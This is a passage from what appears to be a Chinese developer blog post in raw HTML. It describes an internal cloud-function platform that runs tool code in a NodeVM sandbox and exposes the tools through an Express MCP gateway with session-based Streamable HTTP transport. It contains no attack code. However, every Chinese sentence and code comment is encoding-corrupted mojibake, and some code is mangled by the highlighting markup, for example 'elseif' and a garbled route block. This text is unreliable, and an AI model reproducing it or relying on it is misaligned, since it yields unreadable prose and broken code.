    <span class="hljs-keyword">const</span>Â vm =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">NodeVM</span>({Â 
      sandbox,Â  Â 
      <span class="hljs-attr">console</span>:Â <span class="hljs-string">"inherit"</span>,Â  Â  
      <span class="hljs-attr">require</span>: {Â  Â  Â  
        <span class="hljs-attr">builtin</span>: allowedBuiltinDeps,Â  Â  
        <span class="hljs-attr">external</span>: allowedExternalDepsÂ  
      }
    })
    
Â  Â Â <span class="hljs-comment">// 3. æ‰§è¡Œå¼€å‘è€…å†™çš„äº‘å‡½æ•°ä»£ç Â </span>
    <span class="hljs-keyword">return</span>Â <span class="hljs-keyword">await</span>Â vm.<span class="hljs-title function_">run</span>(Â  Â 
      <span class="hljs-string">`module.exports = async () =&gt; {Â <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.code}</span>Â }()`</span>,Â  Â 
      __dirnameÂ  Â 
    ) 
  }
}
</code></pre>
<p>å®ƒæ—¢èƒ½éš”ç¦»é£é™©ï¼Œåˆèƒ½æ³¨å…¥èƒ½åŠ›ï¼š</p>
<ul>
<li>
<p>ç¦æ­¢è®¿é—®æ–‡ä»¶ç³»ç»Ÿ</p>
</li>
<li>
<p>ç¦æ­¢éšæ„ require</p>
</li>
<li>
<p>åªå¼€æ”¾ç™½åå•ä¾èµ–</p>
</li>
<li>
<p>å†…ç½® $yuumiï¼ˆå†…ç½‘ gRPC/HTTP è°ƒç”¨ï¼‰</p>
</li>
<li>
<p>å†…ç½® $json2MarkdownTable</p>
</li>
<li>
<p>å†…ç½® $cookie</p>
</li>
<li>
<p>å†…ç½® $flowï¼ˆä¸Šä¸‹æ–‡ï¼‰</p>
</li>
<li>
<p>å†…ç½® å†…éƒ¨ AI èƒ½åŠ›</p>
</li>
</ul>
<p>äºæ˜¯å¼€å‘è€…ä¼ å…¥çš„ä¸šåŠ¡ä»£ç ç±»ä¼¼è¿™æ ·ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ed89f9e732048ab8bf56270f1d81638~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766133819&amp;x-signature=pdpqv7yiItuQv7bBXc%2FJTPLjNaw%3D" alt="æˆªå±2025-12-12 16.15.57.png" loading="lazy"/></p>
<h3 data-id="heading-9"><strong>4.2 åœ¨çº¿è°ƒè¯•ï¼šmonaco-editor+ Mock</strong> <strong>+ æ²™ç®±æ—¥å¿—</strong></h3>
<p>ç¼–è¾‘å™¨åº•å±‚ç”¨çš„æ˜¯ microsoft/monaco-editorï¼Œå¥½å¤„æ˜¯ï¼š</p>
<ul>
<li>
<p>TypeScript / JS è¯­æ³•é«˜äº®</p>
</li>
<li>
<p>å¯ä»¥åšä¸€äº›ç®€å•çš„æ™ºèƒ½æç¤º</p>
</li>
<li>
<p>UI å¾ˆåƒ VSCodeï¼Œå¤§å®¶ä¸Šæ‰‹æˆæœ¬ä½</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f3e93016c954b8480957446f806fd1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766133819&amp;x-signature=TrJO7at%2FgD5xeQNthjhUgHARBpU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è°ƒè¯•æ–¹é¢ï¼š</p>
<ul>
<li>
<p>æä¾›äº†ä¸€ä¸ª å‚æ•° Mock é¢æ¿ï¼šå¯ä»¥å¡«å…¥è°ƒç”¨æ—¶çš„ JSON</p>
</li>
<li>
<p>ç‚¹å‡»ã€Œè¿è¡Œã€ï¼Œå¹³å°ä¼šåœ¨æ²™ç®±é‡Œè·‘ä¸€éä½ çš„å‡½æ•°ï¼ŒæŠŠï¼šæ—¥å¿—æ‰“å°ï¼ˆconsole.logï¼‰ã€è¿”å›å­—ç¬¦ä¸²ã€å¯èƒ½çš„å¼‚å¸¸ï¼Œå…¨éƒ½å±•ç¤ºå‡ºæ¥</p>
</li>
</ul>
<p>æ¯æ¬¡ä¿å­˜ï¼Œæˆ‘ä»¬éƒ½ä¼šç”Ÿæˆä¸€ä¸ªç‰ˆæœ¬ï¼š</p>
<ul>
<li>
<p>å½“å‰ç¼–è¾‘çš„æ˜¯â€œè‰ç¨¿â€</p>
</li>
<li>
<p>å‘å¸ƒçš„æ—¶å€™ä¼šæŠŠæŸä¸ªç‰ˆæœ¬æ ‡è®°ä¸ºå‘å¸ƒ</p>
</li>
<li>
<p>å‡ºç°é—®é¢˜å¯ä»¥ä¸€é”®å›æ»šåˆ°ä¸Šä¸€ç‰ˆ</p>
</li>
</ul>
<p>æœ€åï¼Œå¼€å‘è€…åªéœ€è¦åœ¨ç¼–è¾‘å™¨é‡Œå†™ä¸€ä¸ª â€œæ™®é€š JS å‡½æ•°â€ï¼Œä½†ï¼š</p>
<ul>
<li>
<p>å®‰å…¨éš”ç¦»ç”± NodeVM è´Ÿè´£</p>
</li>
<li>
<p>å†…ç½‘è°ƒç”¨é  $yuumi</p>
</li>
<li>
<p>ä¼šè¯é  $cookie</p>
</li>
<li>
<p>AI å‹å¥½çš„ç»“æœæ ¼å¼é  $json2MarkdownTable</p>
</li>
</ul>
<h3 data-id="heading-10"><strong>4.3 Tool Argumentsï¼šä¸º AI å¸®å¼€å‘è€…â€œå®šä¹‰æ¥å£â€</strong></h3>
<p>ä¼ ç»Ÿå¼€å‘å†™æ¥å£å‚æ•°ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">roomid:</span>Â <span class="hljs-type">string</span>
</code></pre>
<p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬æä¾›äº†è½¬ä¸º Tool Arguments çš„å¯è§†åŒ–é…ç½®ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b050b1bb0b048d1beff5ef23aa51a69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766133819&amp;x-signature=wrqLT12vzLcwNyoGAqCWoZMoPjc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒä¼šç»Ÿä¸€ç”Ÿæˆï¼š</p>
<ul>
<li>MCP Tool çš„ JSON Schema</li>
<li>StructuredTool çš„ Zod Schema</li>
<li>NodeVM å†… $roomid å˜é‡</li>
</ul>
<p>ä¸€æ¬¡é…ç½®ï¼Œå…¨å¹³å°å¤ç”¨ã€‚</p>
<h3 data-id="heading-11"><strong>4.4 å·¥å…·å¸‚åœºï¼šä¼ä¸šå†…éƒ¨çš„ Agent å·¥å…·ä»“åº“</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48e9a510bb8e4c23854d4c95e491e9c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766133819&amp;x-signature=YhlDZS1wc%2Ba51GW36m25sPM4K1c%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æˆ‘ä»¬æä¾›äº†å·¥å…·å¸‚åœºï¼š</p>
<ul>
<li>å„éƒ¨é—¨æŠŠå·¥å…·ä¸Šæ¶</li>
<li>å…¶ä»–éƒ¨é—¨ç›´æ¥å¤ç”¨</li>
<li>å·¥å…·è¡Œä¸ºä¸€è‡´ï¼Œè°ƒç”¨æ–¹å¼ä¸€è‡´</li>
<li>é¿å…é‡å¤å¼€å‘</li>
</ul>
<p>å·¥å…·ä»â€œé¡¹ç›®èµ„äº§â€å˜æˆâ€œä¼ä¸šèƒ½åŠ›â€ã€‚</p>
<h2 data-id="heading-12"><strong>äº”ã€ç¬¬ä¸‰ç‰ˆï¼šæ¥å…¥ MCP</strong> <strong>â€”â€”è®©å·¥å…·è·¨å¹³å°ã€è·¨æ¨¡å‹ã€è·¨æ¡†æ¶</strong></h2>
<p>åšåˆ°ç¬¬äºŒç‰ˆæ—¶ï¼Œå·¥å…·å·²ç»å˜å¾—å¾ˆå¥½ç”¨äº†ã€‚ä½†è¿˜ç¼ºä¸€å—ï¼š</p>
<blockquote>
<p>åŒä¸€ä»½å·¥å…·å®šä¹‰ï¼Œæ—¢èƒ½åœ¨ Flowise é‡Œå½“ LangChain StructuredTool ç”¨ï¼Œåˆèƒ½åœ¨ MCP é‡Œå˜æˆè·¨å¹³å° ToolCallã€‚</p>
</blockquote>
<h3 data-id="heading-13"><strong>5.1 MCP æ˜¯ä»€ä¹ˆï¼Ÿä»¥åŠä¸€ä¸ªå¸¸è§è¯¯åŒº</strong></h3>
<p>MCP å…¨ç§° Model Context Protocolï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºï¼š</p>
<blockquote>
<p>ç»™â€œå¤§æ¨¡å‹ + å·¥å…·è°ƒç”¨â€å®šä¹‰äº†ä¸€ä¸ªâ€œç»Ÿä¸€æ’çº¿æ¿â€</p>
</blockquote>
<p>å®ƒè§£å†³çš„æ˜¯ï¼š</p>
<ul>
<li>
<p>å¤§æ¨¡å‹æƒ³è°ƒç”¨ä¸€ä¸ªå¤–éƒ¨å·¥å…·</p>
</li>
<li>
<p>è¿™ä¸ªå·¥å…·å¯èƒ½è·‘åœ¨æœ¬æœºã€å¦ä¸€å°æœåŠ¡å™¨ã€ç”šè‡³å¦ä¸€ä¸ªå›¢é˜Ÿçš„ç³»ç»Ÿé‡Œ</p>
</li>
<li>
<p>æˆ‘ä»¬å¸Œæœ›â€œè°ƒç”¨æ–¹å¼â€æ˜¯ç»Ÿä¸€ã€å¯æè¿°ã€å¯æµå¼çš„ã€‚</p>
</li>
</ul>
<h3 data-id="heading-14"><strong>5.2 ä¸€ä¸ªå¸¸è§è¯¯åŒºï¼šæŠŠæ—§æ¥å£ä¸€åŒ…å°±è¡Œäº†ï¼Ÿ</strong></h3>
<p>å¾ˆå¤šäººç¬¬ä¸€ååº”æ˜¯ï¼š</p>
<blockquote>
<p>é‚£æˆ‘æŠŠç°åœ¨çš„ä¸šåŠ¡ HTTP æ¥å£åŒ…æˆä¸€ä¸ª MCP å·¥å…·ï¼Œä¸å°±è¡Œäº†å—ï¼Ÿ</p>
</blockquote>
<p>ç†è®ºä¸Šå¯ä»¥ï¼Œå®è·µé‡Œæœ‰ä¸¤ä¸ªå‘ï¼š</p>
<p><strong>1. Â è‡ªç„¶è¯­è¨€ â‰  æ¥å£å‚æ•°</strong></p>
<p>ç”¨æˆ·ä¼šè¯´ï¼šâ€œæŸ¥ä¸€ä¸‹æœªå®Œæˆçš„ä»»åŠ¡â€ã€‚ä½†ä½ çš„æ¥å£é•¿è¿™æ ·ï¼š/tasks?status=1&amp;owner_id=xxxã€‚ä¸­é—´è¿™å±‚ â€œè‡ªç„¶è¯­è¨€ â†’ status=1â€ çš„æ˜ å°„ï¼Œéœ€è¦ï¼š</p>
<ul>
<li>prompt / few-shot</li>
<li>æšä¸¾è¡¨ / æ˜ å°„å…³ç³»</li>
<li>ç”šè‡³åˆ†ç±»æ¨¡å‹ã€‚</li>
</ul>
<p>æ‰€ä»¥æˆ‘ä»¬åœ¨ Tool Arguments è®¾ç½®æ—¶ä¸€å®šè¦å°½é‡è´´è¿‘è‡ªç„¶è¯­è¨€ï¼Œæ¯”å¦‚ status æè¿°å†™æˆâ€œä»»åŠ¡çš„è¿›åº¦çŠ¶æ€ï¼ˆæœªå¼€å§‹/è¿›è¡Œä¸­/å·²å®Œæˆï¼‰â€ï¼Œè€Œä¸æ˜¯â€œ1/2/3â€ã€‚</p>
<p><strong>2. Â JSON è¿”å› â‰  AI å¯è¯»</strong></p>
<p>å¾ˆå¤šå†…éƒ¨æ¥å£è¿”å›ä¸€å¤§å¨åµŒå¥— JSONï¼ŒLLM è™½ç„¶èƒ½è§£æï¼Œä½†ï¼š</p>
<ul>
<li>å®¹æ˜“â€œæ¼çœ‹â€å­—æ®µï¼›</li>
<li>å›ç­”ä¼šå¾ˆå•°å—¦æˆ–ä¸ç¨³å®šã€‚</li>
<li>æ‰€ä»¥æˆ‘ä»¬åœ¨äº‘å‡½æ•°å±‚ç»Ÿä¸€è§„å®šï¼š</li>
</ul>
<p><strong>è¿”å›ç»™ AI çš„ä¸€å®šæ˜¯â€œäººç±»å¯è¯»â€çš„æ–‡æœ¬/Markdownï¼Œ</strong> JSON åªæ˜¯ä¸­é—´æ€ã€‚</p>
<p>è¿™å°±æ˜¯å‰é¢ $json2MarkdownTable é‚£æ®µä»£ç å­˜åœ¨çš„åŸå› ã€‚</p>
<h3 data-id="heading-15"><strong>5.3 StructuredTool â†’ MCPï¼šæˆ‘ä»¬æ˜¯æ€ä¹ˆåšâ€œä»£ç†å±‚â€çš„ï¼Ÿ</strong></h3>
<p>å‰é¢è¯´äº†ä¸¤ä»¶äº‹ï¼š</p>
<ul>
<li>
<p>å·¥å…·åœ¨å¹³å°å†…éƒ¨ç”¨ LangChain StructuredTool + NodeVM æ¥æ‰§è¡Œ</p>
</li>
<li>
<p>æˆ‘ä»¬å¸Œæœ›åŒä¸€ä»½å·¥å…·å®šä¹‰ï¼Œæ—¢èƒ½åœ¨ Flowise é‡Œç”¨ï¼Œä¹Ÿèƒ½è¢«ä»»æ„æ”¯æŒ MCP çš„ Agent / Studio è°ƒç”¨</p>
</li>
</ul>
<p><strong>createMCPServerï¼šExpress é‡Œçš„ä¸€å±‚ MCP ç½‘å…³</strong></p>
<p>åœ¨æœåŠ¡ç«¯ï¼Œæˆ‘ä»¬åšäº†ä¸€å±‚å¾ˆè–„çš„ MCP ç½‘å…³ï¼ŒæŒ‚åœ¨ Express åº”ç”¨ä¸Šï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby">exportÂ functionÂ createMCPServer({ app, <span class="hljs-title class_">AppDataSource</span> }: <span class="hljs-title class_">App</span>){
  <span class="hljs-regexp">//</span> å•ä¸ªäº‘å‡½æ•° â†’ <span class="hljs-variable constant_">MCP</span>-<span class="hljs-title class_">Streamable</span>HTTPÂ  
  app.post(<span class="hljs-string">'/api/mcp/function-tool/:toolId'</span>, singleToolCreateStreamableHTTPServer)Â Â 
  /<span class="hljs-regexp">/ å¤šä¸ªäº‘å‡½æ•°ç»„åˆ â†’ MCP-StreamableHTTPÂ  app.post('/api</span><span class="hljs-regexp">/mcp/</span><span class="hljs-symbol">:mcpId<span class="hljs-string">', multipleToolCreateStreamableHTTPServer)
  
Â Â // ä¼šè¯åç»­è¯·æ±‚å¤ç”¨
  app.get('</span>/api/mcp/function-tool/</span><span class="hljs-symbol">:id<span class="hljs-string">', handleSessionRequest)Â 
  app.delete('</span>/api/mcp/function-tool/</span><span class="hljs-symbol">:id<span class="hljs-string">', handleSessionRequest)Â  
  app.get('</span>/api/mcp/</span><span class="hljs-symbol">:mcpId<span class="hljs-string">', handleSessionRequest)
  app.delete('</span>/api/mcp/</span><span class="hljs-symbol">:mcpId<span class="hljs-string">', handleSessionRequest)
  
Â Â constÂ transports = {Â 
    streamable: {}Â asÂ Record&lt;string,Â StreamableHTTPServerTransport&gt;Â  
  }
  
Â Â // ... çœç•¥ SSE ç›¸å…³ ...
}
</span></span></code></pre>
<ul>
<li>å¯¹å¤–å°±æ˜¯å‡ æ¡ HTTP è·¯ç”±ï¼›</li>
<li>å¯¹å†…ç»´æŠ¤ä¸€ä¸ª streamable çš„ transport æ± ï¼Œç”¨ sessionId ä½œä¸º keyã€‚</li>
</ul>
<p>è¿™æ ·ï¼Œä¸åŒ AI Studio / Agent åªè¦çŸ¥é“æŸä¸ª URLï¼Œå°±å¯ä»¥æŠŠå®ƒå½“ MCP ç«¯ç‚¹æ¥ç”¨ã€‚</p>
<p><strong>Streamable HTTPï¼šç”¨ session ç®¡ä½ä¸€æ¡â€œé•¿è¿æ¥â€</strong></p>
<p>StreamableHTTPServerTransport æ˜¯ MCP å®˜æ–¹ SDK æä¾›çš„ä¸€ä¸ªä¼ è¾“å®ç°ï¼Œç”¨æ¥åš Streamable HTTP æ¨¡å¼ã€‚æˆ‘ä»¬åšçš„äº‹æƒ…æœ‰ä¸¤ç§æƒ…å†µï¼š</p>
<ol>
<li>
<p>å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡åˆå§‹åŒ–ï¼ˆæ²¡æœ‰ sessionIdï¼‰ï¼›</p>
</li>
<li>
<p>ä¹‹åæ‰€æœ‰è¯·æ±‚éƒ½å¸¦ä¸Š mcp-session-id å¤´ï¼Œå¤ç”¨ä¹‹å‰çš„ sessionã€‚</p>
</li>
</ol>
<p>æ ¸å¿ƒä»£ç å¤§æ¦‚æ˜¯è¿™æ ·ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span>Â <span class="hljs-keyword">function</span>Â <span class="hljs-title function_">createStreamableHTTP</span>(<span class="hljs-params">config: CreateMcpServerConfig</span>){Â Â 
  <span class="hljs-keyword">const</span>Â { req, res, username } = config
  <span class="hljs-keyword">const</span>Â sessionId = req.<span class="hljs-property">headers</span>[<span class="hljs-string">'mcp-session-id'</span>]Â <span class="hljs-keyword">as</span>Â string |Â <span class="hljs-literal">undefined</span>Â 
  <span class="hljs-keyword">let</span>Â <span class="hljs-attr">transport</span>:Â <span class="hljs-title class_">StreamableHTTPServerTransport</span>
  
Â Â <span class="hljs-keyword">if</span>Â (sessionId &amp;&amp; transports.<span class="hljs-property">streamable</span>[sessionId]) {Â  Â 
    <span class="hljs-comment">// â‘  æœ‰ sessionIdï¼Œå¤ç”¨ä¹‹å‰çš„ transportÂ  Â </span>
    transport = transports.<span class="hljs-property">streamable</span>[sessionId]Â  
  }Â elseifÂ (!sessionId &amp;&amp;Â <span class="hljs-title function_">isInitializeRequest</span>(req.<span class="hljs-property">body</span>)) {Â  
    <span class="hljs-comment">// â‘¡ é¦–æ¬¡åˆå§‹åŒ–ï¼Œè¯·æ±‚ä½“ç¬¦åˆ MCP åˆå§‹åŒ–æ ¼å¼Â  Â </span>
    transport =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">StreamableHTTPServerTransport</span>({Â  
      <span class="hljs-attr">sessionIdGenerator</span>:Â <span class="hljs-function">() =&gt;</span>Â <span class="hljs-title function_">randomUUID</span>(),Â  
      <span class="hljs-attr">onsessioninitialized</span>:Â <span class="hljs-function">(<span class="hljs-params">sessionId</span>) =&gt;</span>Â {Â  Â 
        transports.<span class="hljs-property">streamable</span>[sessionId] = transportÂ  Â  
      }
   })
    
Â  Â <span class="hljs-comment">// è¿æ¥å…³é—­æ—¶æ¸…ç†æ‰è¿™ä¸ª sessionÂ </span>
   transport.<span class="hljs-property">onclose</span>Â =Â <span class="hljs-function">() =&gt;</span>Â {Â  Â  
     <span class="hljs-keyword">if</span>Â (transport.<span class="hljs-property">sessionId</span>) {Â  
       <span class="hljs-keyword">delete</span>Â transports.<span class="hljs-property">streamable</span>[transport.<span class="hljs-property">sessionId</span>]Â 
       opsLogger.<span class="hljs-title function_">info</span>(<span class="hljs-string">`[Streamable] åˆ é™¤sessionId: username=<span class="hljs-subst">${username}</span>Â sessionId=<span class="hljs-subst">${transport.sessionId}</span>`</span>)Â  Â  
     }
   }
   
Â  Â <span class="hljs-keyword">const</span>Â server =Â <span class="hljs-title function_">buildMcpServer</span>({Â  
     ...config,Â  Â 
     <span class="hljs-attr">transport</span>:Â <span class="hljs-string">'streamable-http'</span>Â  Â 
   })
   
Â  Â <span class="hljs-keyword">await</span>Â server.<span class="hljs-title function_">connect</span>(transport)Â 
 }Â <span class="hljs-keyword">else</span>Â {Â 
   <span class="hljs-comment">// æ—¢ä¸æ˜¯åˆå§‹åŒ–ï¼Œåˆæ²¡æœ‰åˆæ³• sessionIdï¼šç›´æ¥è¿”å›é”™è¯¯Â  Â </span>
   res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>({Â  
     <span class="hljs-attr">jsonrpc</span>:Â <span class="hljs-string">'2.0'</span>,Â  Â 
     <span class="hljs-attr">error</span>: {Â  Â 
       <span class="hljs-attr">code</span>: -<span class="hljs-number">32000</span>,Â  
       <span class="hljs-attr">message</span>:Â <span class="hljs-string">'Bad Request: No valid session ID provided'</span>Â  Â  
     },
     <span class="hljs-attr">id</span>:Â <span class="hljs-literal">null</span>Â  
   })Â  Â 
   <span class="hljs-keyword">return</span>Â  
  }
 Â 
  <span class="hljs-keyword">await</span>Â transport.<span class="hljs-title function_">handleRequest</span>(req, res, req.<span class="hljs-property">body</span>)
}
</code></pre>
<p>é…åˆä¸€ä¸ªç»Ÿä¸€çš„ä¼šè¯è¯·æ±‚å…¥å£ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">async</span>Â functionÂ <span class="hljs-title">handleSessionRequest</span>(<span class="hljs-params">req: Request, res: Response</span>)</span>{Â Â 
  <span class="hljs-keyword">const</span>Â sessionId = req.headers[<span class="hljs-string">'mcp-session-id'</span>]Â <span class="hljs-keyword">as</span>Â <span class="hljs-built_in">string</span> |Â <span class="hljs-function">undefinedÂ Â 
  <span class="hljs-title">if</span>Â (<span class="hljs-params">!sessionId || !transports.streamable[sessionId]</span>)</span> {Â 
    res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">'Invalid or missing session ID'</span>)Â  Â 
    <span class="hljs-keyword">return</span>Â 
  }
  
Â Â <span class="hljs-keyword">const</span>Â transport = transports.streamable[sessionId]Â Â 
  <span class="hljs-keyword">await</span>Â transport.handleRequest(req, res)}
</code></pre>
<p>è¿™æ ·å®ç°çš„å¥½å¤„æ˜¯ï¼šå®¢æˆ·ç«¯åªéœ€è¦è®°ä½ä¸€ä¸ª mcp-session-idï¼Œä¹‹åæ‰€æœ‰è¯·æ±‚éƒ½å¯ä»¥å¤ç”¨åŒä¸€æ¡ Streamable HTTP ä¼šè¯ã€‚</p>
<p><strong>buildMcpServerï¼šçœŸæ­£æŠŠâ€œå·¥å…·æ³¨å†Œåˆ° MCP åè®®â€</strong></p>
<p>é¦–å…ˆï¼Œç”¨æˆ·å¯ä»¥å°†äº‘å‡½æ•°å¹³å°åˆ›å»ºçš„æ™ºèƒ½ä½“å·¥å…·ä»£ç†åˆ°MCPåè®®ä¸Šï¼Œä¸€ä¸ªMCPå¯ä»¥å…³è”å¤šä¸ªå·¥å…·</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd6378fecd66456ab1223de01e0bfd3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766133819&amp;x-signature=zwA6XxmY7bHCl9wLE6pJI17L0wg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼šç”¨å®˜æ–¹ McpServer æŠŠ Tool Registry é‡Œçš„å·¥å…·æŒ‚æˆ MCP Toolã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span>Â <span class="hljs-title function_">buildMcpServer</span>(<span class="hljs-params">config:Â BuildMcpServerConfig</span>):Â <span class="hljs-title class_">McpServer</span>Â {
  <span class="hljs-keyword">const</span>Â { name, tools, cookie, env, id,Â <span class="hljs-keyword">type</span>, username, transport } = config
  
Â Â <span class="hljs-keyword">const</span>Â server =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">McpServer</span>({Â  
    name,Â 
    <span class="hljs-attr">version</span>:Â <span class="hljs-string">'1.0.0'</span>Â 
  })
  
Â Â <span class="hljs-keyword">for</span>Â (<span class="hljs-keyword">const</span>Â toolÂ <span class="hljs-keyword">of</span>Â tools) {Â 
    <span class="hljs-comment">// 1ï¼‰æŠŠæ•°æ®åº“é‡Œçš„å…ƒä¿¡æ¯ï¼Œè½¬æˆ DynamicStructuredTool å…¥å‚</span>
    <span class="hljs-keyword">const</span>Â obj = {Â  Â  Â Â 
      <span class="hljs-attr">name</span>: tool.<span class="hljs-property">name</span>,
      <span class="hljs-attr">description</span>: tool.<span class="hljs-property">description</span>,Â  
      <span class="hljs-attr">schema</span>: z.<span class="hljs-title function_">object</span>(<span class="hljs-title function_">convertSchemaToZod</span>(tool.<span class="hljs-property">schema</span>Â <span class="hljs-keyword">as</span>Â <span class="hljs-built_in">string</span>Â |Â <span class="hljs-built_in">object</span>)),Â  Â  Â Â 
      <span class="hljs-attr">code</span>: tool.<span class="hljs-property">func</span>Â <span class="hljs-keyword">as</span>Â <span class="hljs-built_in">string</span>Â  
    }
    
Â  Â Â <span class="hljs-comment">// DynamicStructuredTool å†…éƒ¨å°±æ˜¯ä¸€ä¸ªâ€œåŠ¨æ€ StructuredToolâ€ + NodeVM æ²™ç®±</span>
    <span class="hljs-keyword">const</span>Â dynamicStructuredTool =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">DynamicStructuredTool</span>(obj)
    
Â  Â Â <span class="hljs-comment">// Flow ä¿¡æ¯ï¼šcookie + envï¼ˆæ¥è‡ª MCP URL ä¸Šçš„ sign / å…¶å®ƒquery)</span>
    dynamicStructuredTool.<span class="hljs-title function_">setFlowObject</span>({Â 
      cookie,Â  
      <span class="hljs-attr">env</span>:Â <span class="hljs-keyword">typeof</span>Â env ===Â <span class="hljs-string">'object'</span>Â &amp;&amp;Â <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(env).<span class="hljs-property">length</span>Â ? env : {}Â  Â 
    })
    
Â  Â Â <span class="hljs-comment">// 2ï¼‰æŠŠæˆ‘ä»¬åœ¨ UI é‡Œé…ç½®çš„ Tool Arguments schemaï¼Œè½¬æˆ MCP éœ€è¦çš„ zod å‚æ•°å®šä¹‰Â </span>
    <span class="hljs-keyword">const</span>Â schemaParser = (tool.<span class="hljs-property">schema</span>Â ?Â <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(tool.<span class="hljs-property">schema</span>) : [])Â <span class="hljs-keyword">as</span>Â <span class="hljs-title class_">Schema</span>[]
    
Â  Â Â <span class="hljs-keyword">const</span>Â paramsSchema = schemaParser.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">res, cur</span>) =&gt;</span>Â {Â  
      <span class="hljs-keyword">if</span>Â (cur.<span class="hljs-property">required</span>) {Â 
        res[cur.<span class="hljs-property">property</span>] = z[cur.<span class="hljs-property">type</span>]({Â <span class="hljs-attr">required_error</span>:Â <span class="hljs-string">`<span class="hljs-subst">${cur.property}</span>Â required`</span>Â })Â  Â 
          .<span class="hljs-title function_">describe</span>(cur.<span class="hljs-property">description</span>)Â <span class="hljs-keyword">as</span>Â z.<span class="hljs-property">ZodTypeAny</span>Â  Â 
      }Â <span class="hljs-keyword">else</span>Â {Â  Â 
        res[cur.<span class="hljs-property">property</span>] = z[cur.<span class="hljs-property">type</span>]()Â  Â 
          .<span class="hljs-title function_">describe</span>(cur.<span class="hljs-property">description</span>)Â  Â  Â 
          .<span class="hljs-title function_">optional</span>()Â <span class="hljs-keyword">as</span>Â z.<span class="hljs-property">ZodTypeAny</span>Â  Â  
      }
      <span class="hljs-keyword">return</span>Â resÂ  Â 
    }, {}Â <span class="hljs-keyword">as</span>Â <span class="hljs-built_in">any</span>)
    
Â  Â Â <span class="hljs-comment">// 3ï¼‰ç”¨å®˜æ–¹ server.tool() æ–¹æ³•æ³¨å†Œ MCP ToolÂ </span>
    server.<span class="hljs-title function_">tool</span>(tool.<span class="hljs-property">name</span>, tool.<span class="hljs-property">description</span>, paramsSchema,Â <span class="hljs-keyword">async</span>Â (args, _extra) =&gt; {Â  Â 
      <span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œçš„ call() å¯¹åº”çš„å°±æ˜¯ LangChain StructuredTool._call()Â  </span>
      <span class="hljs-keyword">const</span>Â runnerResult =Â <span class="hljs-keyword">await</span>Â dynamicStructuredTool.<span class="hljs-title function_">call</span>({Â  
        ...args
      })
      
Â  Â  Â Â <span class="hljs-comment">// çº¿ä¸Šç¯å¢ƒåšä¸€å±‚ä½¿ç”¨ä¸ŠæŠ¥ï¼ˆæ–¹ä¾¿ç»Ÿè®¡è°åœ¨ç”¨å“ªä¸ª MCPï¼‰</span>
      <span class="hljs-keyword">if</span>Â (process.<span class="hljs-property">env</span>.<span class="hljs-property">DEPLOY_ENV</span>Â ===Â <span class="hljs-string">'prod'</span>) {Â  Â 
        <span class="hljs-title function_">reportMcpUse</span>({Â  Â 
          id,Â  
          <span class="hljs-keyword">type</span>,Â  Â 
          name,Â  Â 
          username,Â  
          transportÂ  
        })Â  Â 
       }
       
Â  Â  Â Â  <span class="hljs-comment">// MCP åè®®ç»Ÿä¸€çš„è¿”å›æ ¼å¼ï¼šcontent[] æ•°ç»„Â  </span>
       <span class="hljs-keyword">return</span>Â {Â  Â  
         <span class="hljs-attr">content</span>: [{Â <span class="hljs-attr">type</span>:Â <span class="hljs-string">'text'</span>,Â <span class="hljs-attr">text</span>: runnerResult }]Â  
       }
     })
   }
   
 Â Â <span class="hljs-keyword">return</span>Â server
 }
</code></pre>
<p>æŠŠTool Registry é‡Œçš„ï¼š</p>
<ul>
